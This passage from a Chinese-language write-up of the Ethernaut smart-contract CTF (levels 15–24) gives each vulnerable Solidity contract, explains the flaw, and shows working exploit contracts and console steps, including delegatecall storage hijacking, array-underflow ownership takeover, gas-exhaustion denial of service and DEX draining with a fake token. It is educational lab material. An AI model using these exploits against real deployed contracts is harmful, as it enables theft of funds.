gateKey));    &#125;&#125;\n\n\n\n15. Naught Coin闯关要求NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;; contract NaughtCoin is ERC20 &#123;  // string public constant name = &#x27;NaughtCoin&#x27;;  // string public constant symbol = &#x27;0x0&#x27;;  // uint public constant decimals = 18;  uint public timeLock = now + 10 * 365 days;  uint256 public INITIAL_SUPPLY;  address public player;  constructor(address _player)   ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;)  public &#123;    player = _player;    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));    // _totalSupply = INITIAL_SUPPLY;    // _balances[player] = INITIAL_SUPPLY;    _mint(player, INITIAL_SUPPLY);    emit Transfer(address(0), player, INITIAL_SUPPLY);  &#125;    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;    super.transfer(_to, _value);  &#125;  // Prevent the initial owner from transferring tokens until the timelock has passed  modifier lockTokens() &#123;    if (msg.sender == player) &#123;      require(now &gt; timeLock);      _;    &#125; else &#123;     _;    &#125;  &#125; &#125; \n\n合约分析\n根据题意，需要将自己的 balance 清空。合约提供了 transfer() 进行转账，但有一个 modifier lockTokens() 限制，只有 10 年后才能调用 transfer()\n注意该合约是 ERC20 的子合约，题目中也给了 The ERC20 Spec 和 The OpenZeppelin codebase\n在子合约找不出更多信息的时候，把目光更多放到父合约 ERC20.sol 和接口上\n在 The ERC20 Spec 中，除了 transfer() 之外，还有 transferFrom() 函数也可以进行转账\n直接看父合约 ERC20.sol\n\n contract ERC20 is Context, IERC20, IERC20Metadata &#123;\t...    function transfer(address to, uint256 amount) public virtual override returns (bool) &#123;        address owner = _msgSender();        _transfer(owner, to, amount);        return true;    &#125;        function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;        return _allowances[owner][spender];    &#125;    function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;        address owner = _msgSender();        _approve(owner, spender, amount);        return true;    &#125;        function transferFrom(        address from,        address to,        uint256 amount    ) public virtual override returns (bool) &#123;        address spender = _msgSender();        _spendAllowance(from, spender, amount);        _transfer(from, to, amount);        return true;    &#125;    ...        function _transfer(        address from,        address to,        uint256 amount    ) internal virtual &#123;        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);        _beforeTokenTransfer(from, to, amount);        uint256 fromBalance = _balances[from];        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);        unchecked &#123;            _balances[from] = fromBalance - amount;        &#125;        _balances[to] += amount;        emit Transfer(from, to, amount);        _afterTokenTransfer(from, to, amount);    &#125;        function _approve(        address owner,        address spender,        uint256 amount    ) internal virtual &#123;        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);        _allowances[owner][spender] = amount;        emit Approval(owner, spender, amount);    &#125;        function _spendAllowance(        address owner,        address spender,        uint256 amount    ) internal virtual &#123;        uint256 currentAllowance = allowance(owner, spender);        if (currentAllowance != type(uint256).max) &#123;            require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);            unchecked &#123;                _approve(owner, spender, currentAllowance - amount);            &#125;        &#125;    &#125;    ...&#125;\n\n\n看 transferFrom 函数，其中调用了 _spendAllowance 函数，在 _spendAllowance 函数中，有这样几行代码\nuint256 currentAllowance = allowance(owner, spender);      if (currentAllowance != type(uint256).max) &#123;          require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);          unchecked &#123;              _approve(owner, spender, currentAllowance - amount);          &#125;      &#125;\n\n就相当于tranfer直接是拥有者调用，将他的代币转给别人，而transferFrom是由被转账的人调用，这个allowance(owner, spender)就是许可的金额，意思是owner这个账号允许转给spender这个账号的代币的数量，如果这个不空的话，spender就可以调用transferFrom函数从owner那里获得转账。\n\n可以直接调用这个 transferFrom ，但是 transferFrom 需要 allowance(owner, spender) 不为空，在 _approve 函数中可以设定 _allowances[owner][spender] 的值，而_approve 函数是被 approve 函数调用了，由于我们就是合约的 owner ，所以可以自己调用 approve 给自己授权\n\n\n攻击流程查询余额\n\n(await contract.allowance(player, &quot;0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624&quot;)).toString() &quot;1000000000000000000000000&quot;await contract.approve(&quot;0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624&quot;, (await contract.balanceOf(player)).toString())await contract.transferFrom(player, &#x27;0xcd69Bb01b11200a24F2792Abb643f38625e9FBd1&#x27;, (await contract.balanceOf(player)).toString())\n\n再次查询余额\n\n\n16. Preservation闯关要求此合同使用库存储两个不同时区的两个不同时间，构造函数为每次要存储的库创建两个实例。 而玩家的目标是获取合约的owner权限。\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Preservation &#123;  // public library contracts   address public timeZone1Library;  address public timeZone2Library;  address public owner;   uint storedTime;  // Sets the function signature for delegatecall  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;    timeZone1Library = _timeZone1LibraryAddress;     timeZone2Library = _timeZone2LibraryAddress;     owner = msg.sender;  &#125;   // set the time for timezone 1  function setFirstTime(uint _timeStamp) public &#123;    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  &#125;  // set the time for timezone 2  function setSecondTime(uint _timeStamp) public &#123;    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123;  // stores a timestamp   uint storedTime;    function setTime(uint _time) public &#123;    storedTime = _time;  &#125;&#125;\n\n合约分析\ndelegatecall 与 call 功能类似，区别在于 delegatecall 仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。注意 delegatecall 是危险函数，它可以完全操作当前合约的状态（实现变量覆盖），可以参考第7题 Delegation\ncontract a&#123;    uint public x1;    uint public x2;    function funca(address param)&#123;        param.delegate(bytes4(keccak256(&quot;funcb()&quot;)));    &#125;&#125;contract b&#123;    uint public y1;    uint public y2;    function funcb()&#123;        y1=1;        y2=2;    &#125;&#125;\n\n上述合约中，一旦在 a 中调用了 b 的funcb函数，那么对应 a 中 x1 就会等于，x2 就会等于 2。\n在这个过程中实际 b 合约的funcb函数是把 storage 里面的slot 1的值更换为了 1，把slot 2的值更换为了 2，那么由于 delegatecall 的原因这里修改的是 a 的 storage，对应就是修改了 x1，x2。\n\ndelegateCall 方法仅仅使用目标合约的代码， 其余的 storage 等数据均使用自己的，这就使得某些访存操作会错误的处理对象\n\n所以这个题可以这样解决：\n\n我们调用 Preservation 的 setFirstTime 函数实际通过 delegatecall 执行了 LibraryContract 的 setTime 函数，修改了 slot 1 ，也就是修改了 timeZone1Library 变量\n这样，我们第一次调用 setFirstTime 将 timeZone1Library 变量修改为我们的恶意合约的地址，第二次调用 setFirstTime 就可以执行我们的任意代码了\n\n\n\n攻击流程pragma solidity ^0.6.0;contract Preservation &#123;  // public library contracts   address public timeZone1Library;  address public timeZone2Library;  address public owner;   uint storedTime;  // Sets the function signature for delegatecall  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;    timeZone1Library = _timeZone1LibraryAddress;     timeZone2Library = _timeZone2LibraryAddress;     owner = msg.sender;  &#125;   // set the time for timezone 1  function setFirstTime(uint _timeStamp) public &#123;    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  &#125;  // set the time for timezone 2  function setSecondTime(uint _timeStamp) public &#123;    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123;  // stores a timestamp   uint storedTime;    function setTime(uint _time) public &#123;    storedTime = _time;  &#125;&#125;contract exploit &#123;    address public timeZone1Library;    address public timeZone2Library;    address public owner;    address instance_add = 0xFCe5b78fC7F350b7a710e644E67A232856E097Fc;    Preservation preservation = Preservation(instance_add);    function attack1() public &#123;        preservation.setFirstTime(uint(address(this)));    &#125;    function attack2() public &#123;        preservation.setFirstTime(uint(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624)); //玩家地址    &#125;    function setTime(uint _time) public &#123;        timeZone1Library = address(_time);        timeZone2Library = address(_time);        owner = address(_time);    &#125;&#125;\n\n\n17. Recovery闯关要求合约的创建者已经构建了一个非常简单的合约示例。任何人都可以轻松地创建新的代币。部署第一个令牌合约后，创建者发送了0.5ether以获取更多token。后来他们失去了合同地址。 如果您可以从丢失的合同地址中恢复（或移除）0.5ether，则此级别将完成。\n合约代码pragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract Recovery &#123;  //generate tokens  function generateToken(string memory _name, uint256 _initialSupply) public &#123;    new SimpleToken(_name, msg.sender, _initialSupply);    &#125;&#125;contract SimpleToken &#123;  using SafeMath for uint256;  // public variables  string public name;  mapping (address =&gt; uint) public balances;  // constructor  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;    name = _name;    balances[_creator] = _initialSupply;  &#125;  // collect ether in return for tokens  receive() external payable &#123;    balances[msg.sender] = msg.value.mul(10);  &#125;  // allow transfers of tokens  function transfer(address _to, uint _amount) public &#123;     require(balances[msg.sender] &gt;= _amount);    balances[msg.sender] = balances[msg.sender].sub(_amount);    balances[_to] = _amount;  &#125;  // clean up after ourselves  function destroy(address payable _to) public &#123;    selfdestruct(_to);  &#125;&#125;\n\n合约分析区块链上所有信息都是公开的，将实例地址拿到区块链浏览器上去查询即可找回合同地址，再利用 selfdestruct 恢复0.5ether\n攻击流程 实例地址：0x08F66239f112CA4CF479E7a73dEc1d11b6cB92D3\nhttps://rinkeby.etherscan.io/address/0x08F66239f112CA4CF479E7a73dEc1d11b6cB92D3#internaltx\n\n再通过交易信息找到生产合约 lost contract 的地址:0xfB481D6c4B732735Bc0345617e38a8f355DB9985\n\n拿到丢失的合约地址以后，去remix部署 SimpleToken ，使用 At address 指定 lost contract 的地址，然后执行 destroy(play_address) 即可\n\n\n查看合约地址，发现已经被销毁：https://rinkeby.etherscan.io/address/0xfb481d6c4b732735bc0345617e38a8f355db9985#internaltx\n\n也可以手动计算地址。\npublic a = address（keccak256（0xd6,0x94，YOUR_ADDR，0x01））;\n参考链接\n18. MagicNumber闯关要求要解决这个级别，您只需要向etranaut提供一个“Solver”，这是一个响应“whatistMeaningoflife()”的契约，并提供正确的数字。 很容易吧？好。。。有个陷阱。 解算器的代码需要非常小。真的很小。就像怪物真的有点小：最多10个操作码。 提示：也许是时候暂时离开Solidity编译器的舒适性，手工构建这个编译器了。没错：原始EVM字节码。 祝你好运！即要求输出42(操作码为2A)。\n\n题目的意思就是部署一个合约 Solver ，要求在被调用 whatIsTheMeaningOfLife() 函数时返回 42 就可以了，但有一个限制是不能超过 10 个 opcode\n\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract MagicNum &#123;  address public solver;  constructor() public &#123;&#125;  function setSolver(address _solver) public &#123;    solver = _solver;  &#125;  /*    ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____             __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___             ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__             ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___             ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____             __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________             _\\///////////\\\\\\//____/\\\\\\/___________             ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_             ___________\\///_____\\///////////////__  */&#125;\n\n合约分析创建一个简单的合约\npragma solidity ^0.4.11;contract C &#123;&#125;\n\nbytecode\n&#123;\t&quot;linkReferences&quot;: &#123;&#125;,\t&quot;object&quot;: &quot;6080604052348015600f57600080fd5b50603580601d6000396000f3006080604052600080fd00a165627a7a72305820eb3bb9eb1153de451fdb73f63dffc5c28f93dd665ad0b87028137bef976257500029&quot;, //字节码\t&quot;opcodes&quot;: &quot;PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x35 DUP1 PUSH1 0x1D PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xeb EXTCODESIZE 0xb9 0xeb GT MSTORE8 0xde GASLIMIT 0x1f 0xdb PUSH20 0xF63DFFC5C28F93DD665AD0B87028137BEF976257 POP STOP 0x29 &quot;,\t&quot;sourceMap&quot;: &quot;26:15:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;26:15:0;;;;;;;&quot;&#125;\n\n我们可以将上面的字节码分成3个独立的块：\n//部署代码60606040523415600e57600080fd5b5b603680601c6000396000f300//合约代码60606040525b600080fd00// Auxdataa165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029\n\n\n创建合约时运行部署代码\n合约创建成功之后当它的方法被调用时，运行合约代码\n（可选）Auxdata是源码的加密指纹，用来验证。这只是数据，永远不会被EVM执行\n\n部署代码有两个主要作用：\n\n运行构造器函数，并设置初始化内存变量（就像合约的拥有者）\n计算合约代码，并返回给EVM\n\nSolidity编译器产生的部署代码会从字节码中加载60606040525b600080fd00到内存中，然后将它作为合约代码返回。在这个例子中，“计算”只是读取一块数据到内存中。原则上，我们可以编程地产生合约代码。\n常用的汇编指令：\n\n\n.code  PUSH 80\t\t\tcontract C &#123;\\r\\n&#125;  PUSH 40\t\t\tcontract C &#123;\\r\\n&#125;  MSTORE \t\t\tcontract C &#123;\\r\\n&#125;  CALLVALUE \t\t\tcontract C &#123;\\r\\n&#125;  DUP1 \t\t\tolidity ^  ISZERO \t\t\ta   PUSH [tag] 1\t\t\ta   JUMPI \t\t\ta   PUSH 0\t\t\tr  DUP1 \t\t\to  REVERT \t\t\t.11;\\r\\ncontratag 1\t\t\ta   JUMPDEST \t\t\ta   POP \t\t\tcontract C &#123;\\r\\n&#125;  PUSH #[$] 0000000000000000000000000000000000000000000000000000000000000000\t\t\tcontract C &#123;\\r\\n&#125;  DUP1 \t\t\tcontract C &#123;\\r\\n&#125;  PUSH [$] 0000000000000000000000000000000000000000000000000000000000000000\t\t\tcontract C &#123;\\r\\n&#125;  PUSH 0\t\t\tcontract C &#123;\\r\\n&#125;  CODECOPY \t\t\tcontract C &#123;\\r\\n&#125;  PUSH 0\t\t\tcontract C &#123;\\r\\n&#125;  RETURN \t\t\tcontract C &#123;\\r\\n&#125;.data  0:    .code      PUSH 80\t\t\tcontract C &#123;\\r\\n&#125;      PUSH 40\t\t\tcontract C &#123;\\r\\n&#125;      MSTORE \t\t\tcontract C &#123;\\r\\n&#125;      PUSH 0\t\t\tcontract C &#123;\\r\\n&#125;      DUP1 \t\t\tcontract C &#123;\\r\\n&#125;      REVERT \t\t\tcontract C &#123;\\r\\n&#125;    .data\n\nbytecode由两部分构成。\n第一部分的.code包含了一些smart contract初始化的代码，比如构造函数，state variable（全局变量）的赋值等操作。区块链上，这些都是EOA在部署合约时就执行完成的。\n从.data开始，是smart contract的runtime bytecode，也就是在区块链上保存的合约的bytecode。 \ncodecopy(t, f, s)-F 从代码的位置 f 开始拷贝 s 个字节到内存的位置 t\n参考1\n参考2\n参考3\n攻击流程参考\nbytecode = &quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;;web3.eth.sendTransaction(&#123;from:player,data:bytecode&#125;)\n\n得到合约https://rinkeby.etherscan.io/tx/0xb354513ca1442426057f5aa0f2404ff4578725d68eccf27a7cdf9535157e7086\n\nawait contract.setSolver(&#x27;0x1373751D06eC2214c36C314C4e5Ed13b520830Ad&#x27;)\n\n\n19. Alien Codex闯关要求你打开了一个 Alien 合约. 申明所有权来完成这一关.\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.5.0;import &#x27;../helpers/Ownable-05.sol&#x27;;contract AlienCodex is Ownable &#123;  bool public contact;  bytes32[] public codex;  modifier contacted() &#123;    assert(contact);    _;  &#125;    function make_contact() public &#123;    contact = true;  &#125;  function record(bytes32 _content) contacted public &#123;  \tcodex.push(_content);  &#125;  function retract() contacted public &#123;    codex.length--;  &#125;  function revise(uint i, bytes32 _content) contacted public &#123;    codex[i] = _content;  &#125;&#125;\n\n合约分析\n合约开头 import 了 Ownable.sol 合约，同时也引入了一个 owner 变量\n由于 EVM 存储优化的关系，在 slot [0]中同时存储了contact和owner，需要做的就是将owner变量覆盖为自己。\nawait web3.eth.getStorageAt(instance, 0, function(x, y) &#123;console.info(y)&#125;);// 0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272 slot0// 对应的 contact 为零,Owner=0xda5b3fb76c78b6edee6be8f11a1c31ecfb02b272\n数组 codex 的 slot 为 1 ，同时这也是存储数组 length 的地方，而 codex 的实际内容存储在 keccak256(bytes32(1)) 开始的位置\n\n参考 Solidity中各种变量的存储方式\n\n\n因为总共有 2^256 个 slot ，要修改 slot 0 ，假设 codex 实际所在 slot x ，(对于本题来说，数组的 slot是 1 ， x=keccak256(bytes32(1))) ，那么当我们修改 codex[y],(y=2^256-x+0) 时就能修改 slot 0 ，从而修改 owner\n\n给位于数组相对的位置赋值\n\n我们要修改 codex[y] ，那就要满足 y &lt; codex.length ，而这个时候 codex.length =0 ，但是我们可以通过 retract() 使 length 下溢，然后就可以操纵 codex[y] 了\n\n\n\n调用任何函数都需要绕过修饰关键词contacted的限制，也就是需要使contact = true，那就是调用make_contact() 函数\n\n\n攻击流程\n先调用 make_contact 函数\n\n\n计算codex 的位置\npragma solidity ^0.4.18;contract test &#123;function go() view returns(bytes32)&#123;   return keccak256((bytes32(1)));&#125;&#125;\n\n\n即 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6\n\ny = 2^256-x+0 = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a\n\n通过 retract() 使得 codex 数组 length 下溢，使其满足 y &lt; codex.length\n\n将 owner 换成 player 地址即可\nawait contract.owner()// &quot;0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272&quot;contract.revise(&#x27;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&#x27;,&quot;0x0000000000000000000000019DC97146b924263A2c8C7237FbeEAFb6ef60b624&quot;)// 调用 revise()await contract.owner()// &#x27;0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624&#x27;\n\n\n\n\n20. Denial闯关要求这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。\n如果您可以在所有者调用withdraw() 时拒绝提取资金（而合约仍有资金，并且交易的gas 为1M 或更少），您将赢得此级别。\n即造成DOS使得合约的owner在调用withdraw时无法正常提取资产。\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract Denial &#123;    using SafeMath for uint256;    address public partner; // withdrawal partner - pay the gas, split the withdraw    address payable public constant owner = address(0xA9E);    uint timeLastWithdrawn;    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances    function setWithdrawPartner(address _partner) public &#123;        partner = _partner;    &#125;    // withdraw 1% to recipient and 1% to owner    function withdraw() public &#123;        uint amountToSend = address(this).balance.div(100);        // perform a call without checking return        // The recipient can revert, the owner will still get their share        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);        owner.transfer(amountToSend);        // keep track of last withdrawal time        timeLastWithdrawn = now;        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);    &#125;    // allow deposit of funds    receive() external payable &#123;&#125;    // convenience function    function contractBalance() public view returns (uint) &#123;        return address(this).balance;    &#125;&#125;\n\n合约分析\n可以使 transfer 失败，也就是把 gas 耗光\n使用 assert 失败的话，将会 spend all gas ，这样的话 owner.transfer(amountToSend) 将执行失败\n重入漏洞 partner.call.value(amountToSend)() ，利用重入漏洞把 gas 消耗完\n\n\n\n攻击流程pragma solidity ^0.6.0;import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;contract Denial &#123;    using SafeMath for uint256;    address public partner; // withdrawal partner - pay the gas, split the withdraw    address payable public constant owner = address(0xA9E);    uint timeLastWithdrawn;    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances    function setWithdrawPartner(address _partner) public &#123;        partner = _partner;    &#125;    // withdraw 1% to recipient and 1% to owner    function withdraw() public &#123;        uint amountToSend = address(this).balance.div(100);        // perform a call without checking return        // The recipient can revert, the owner will still get their share        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);        owner.transfer(amountToSend);        // keep track of last withdrawal time        timeLastWithdrawn = now;        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);    &#125;    // allow deposit of funds    receive() external payable &#123;&#125;    // convenience function    function contractBalance() public view returns (uint) &#123;        return address(this).balance;    &#125;&#125;contract exploit1 &#123;    address payable instance_add = 0x015307cCEE55050ae6743c019aDc847ae32c6efA;    Denial denial = Denial(instance_add);    function attack() public &#123;        denial.setWithdrawPartner(address(this));        denial.withdraw();    &#125;    fallback() payable external&#123;        assert(0==1);    &#125;&#125;contract exploit2 &#123;    address payable instance_add = 0xE8E0615aA560F06D0361Abb92c11230DC2671b59;    function attack() public &#123;        instance_add.call(abi.encodeWithSignature(&quot;setWithdrawPartner(address)&quot;,this));        instance_add.call(abi.encodeWithSignature(&quot;withdraw()&quot;));     &#125;    fallback() payable external&#123;        instance_add.call(abi.encodeWithSignature(&quot;withdraw()&quot;));     &#125;&#125;\n\n\n\n\n21. Shop闯关要求从商店以低于要求的价格购买商品\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;interface Buyer &#123;  function price() external view returns (uint);&#125;contract Shop &#123;  uint public price = 100;  bool public isSold;  function buy() public &#123;    Buyer _buyer = Buyer(msg.sender);    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;      isSold = true;      price = _buyer.price();    &#125;  &#125;&#125;\n\n合约分析类似题目 Elevator\n攻击流程pragma solidity ^0.6.0;interface Buyer &#123;  function price() external view returns (uint);&#125;contract Shop &#123;  uint public price = 100;  bool public isSold;  function buy() public &#123;    Buyer _buyer = Buyer(msg.sender);    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;      isSold = true;      price = _buyer.price();    &#125;  &#125;&#125;contract exploit &#123;    address instance_add = 0xB91785ecbbC89B9AEEDb41890bACfAa7C6C39467;    Shop shop = Shop(instance_add);    function price() external view returns (uint) &#123;        return Shop(msg.sender).isSold() == true ? 99 : 100;    &#125;    function attack() public &#123;        shop.buy();    &#125;&#125;\n\n\n22. Dex闯关要求此级别的目标是让您破解下面的基本 DEX 合约并通过价格操纵窃取资金。\n您将从 token1 的 10 个令牌和 token2 的 10 个令牌开始。 DEX 合约以每个代币 100 个开始。\n如果您设法从合约中取出所有 2 个代币中的至少 1 个，并允许合约报告资产的“坏”价格，您将在此级别上取得成功。 \n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract Dex  &#123;  using SafeMath for uint;  address public token1;  address public token2;  constructor(address _token1, address _token2) public &#123;    token1 = _token1;    token2 = _token2;  &#125;  function swap(address from, address to, uint amount) public &#123;    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);    uint swap_amount = get_swap_price(from, to, amount);    IERC20(from).transferFrom(msg.sender, address(this), amount);    IERC20(to).approve(address(this), swap_amount);    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);  &#125;  function add_liquidity(address token_address, uint amount) public&#123;    IERC20(token_address).transferFrom(msg.sender, address(this), amount);  &#125;  function get_swap_price(address from, address to, uint amount) public view returns(uint)&#123;    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));  &#125;  function approve(address spender, uint amount) public &#123;    SwappableToken(token1).approve(spender, amount);    SwappableToken(token2).approve(spender, amount);  &#125;  function balanceOf(address token, address account) public view returns (uint)&#123;    return IERC20(token).balanceOf(account);  &#125;&#125;contract SwappableToken is ERC20 &#123;  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;        _mint(msg.sender, initialSupply);  &#125;&#125;\n\n合约分析有两种方法\n\n利用 get_swap_price 中的汇率\nget_swap_price 是确定 Dex 中代币之间汇率的方法。其中的除法并不总是计算为一个完美的整数，而是一个分数。Solidity 中没有分数类型。所以会有3 / 2 = 1 的情况出现\n\n\n新建 token3 换取 token1 即可\n\n\n攻击流程\n跳入控制台。首先批准合同以转移您的代币，并提供足够大的限额，这样我们就不必一次又一次地批准。\nawait contract.approve(contract.address, 500)\n\n获取令牌地址：\nt1 = await contract.token1()t2 = await contract.token2()\n\n现在对上面的表行一一对应执行 7 次交换：\nawait contract.swap(t1, t2, 10)await contract.swap(t2, t1, 20)await contract.swap(t1, t2, 24)await contract.swap(t2, t1, 30)await contract.swap(t1, t2, 41)await contract.swap(t2, t1, 45)\n\n通过以下方式验证：\nawait contract.balanceOf(t1, instance).then(v =&gt; v.toString())// Output: &#x27;0&#x27;\n\n\n\n```soliditypragma solidity 0.6.0;\ncontract MyERC20Token {\naddress hacker = 0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624;\naddress target = 0x1352D4d6EbA9aDcb4827765DC93a877588d8bd33;\n\nfunction balanceOf(address account) public view returns (uint256) &#123;\n    if (account == hacker || account == target) &#123;\n        return 1;\n    &#125; else &#123;\n        return 1;\n    &#125;\n&#125;\n\nfunction transferFrom(address, address, uint256) public returns (bool) &#123;\n    return true;\n&#125;\n\n}\ninterface Dex {\nfunction swap(address, address, uint) external;\n\n}\ncontract exploit {\naddress token3 = address(new MyERC20Token());\nDex dex = Dex(0x1352D4d6EbA9aDcb4827765DC93a877588d8bd33);\naddress token1 = 0xd3752A3Aec6d7f94a94aA78E8651bb490d44d97D;\naddress token2 = 0x190353BB8118e70aFB739c477f5b4ff1dB624eAD;\n\nconstructor() public &#123;\n    dex.swap(token3,token2,1);\n&#125;\n\n}\n## 23. Dex Two### 闯关要求此级别将要求您以不同的方式打破 DexTwo，这是对前一级别进行了细微修改的 Dex 合约。您需要从 DexTwo 合约中耗尽 token1 和 token2 的所有余额才能在此级别上取得成功。您仍将从 token1 的 10 个令牌和 token2 的 10 个令牌开始。 DEX 合约仍然以每个代币 100 个开始。### 合约代码```solidity// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract DexTwo  &#123;  using SafeMath for uint;  address public token1;  address public token2;  constructor(address _token1, address _token2) public &#123;    token1 = _token1;    token2 = _token2;  &#125;  function swap(address from, address to, uint amount) public &#123;    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);    uint swap_amount = get_swap_amount(from, to, amount);    IERC20(from).transferFrom(msg.sender, address(this), amount);    IERC20(to).approve(address(this), swap_amount);    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);  &#125;  function add_liquidity(address token_address, uint amount) public&#123;    IERC20(token_address).transferFrom(msg.sender, address(this), amount);  &#125;  function get_swap_amount(address from, address to, uint amount) public view returns(uint)&#123;    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));  &#125;  function approve(address spender, uint amount) public &#123;    SwappableTokenTwo(token1).approve(spender, amount);    SwappableTokenTwo(token2).approve(spender, amount);  &#125;  function balanceOf(address token, address account) public view returns (uint)&#123;    return IERC20(token).balanceOf(account);  &#125;&#125;contract SwappableTokenTwo is ERC20 &#123;  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;        _mint(msg.sender, initialSupply);  &#125;&#125;\n\n合约分析与Dex同理\n          DEX             |          player  token1 - token2 - token3  | token1 - token2 - token3-----------------------------------------------------  100     100      100    |   10      10      300  0       100      200    |   110     10      200  0       0        400    |   110     110     0\n\n攻击流程创建token3\npragma solidity ^0.8.0;import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;contract Token3 is ERC20 &#123;    constructor(uint256 initialSupply) ERC20(&quot;Token3&quot;, &quot;t3&quot;) &#123;        _mint(msg.sender, initialSupply);    &#125;&#125;\n\n指定地址\n\n向合约中的t3打入100，并批准合同以转移代币\n\n实例中也需要批准\nawait contract.approve(contract.address, 500)\n\n检查余额\n\n依次执行\nawait contract.swap(t3, t1, 100)await contract.swap(t3, t2, 200)\n\n再次检查余额\nawait contract.balanceOf(t1, instance).then(v =&gt; v.toString())//&#x27;0&#x27;await contract.balanceOf(t2, instance).then(v =&gt; v.toString())//&#x27;0&#x27;\n\n提交实例\n\n24. Puzzle Wallet闯关要求事实上，如今，为 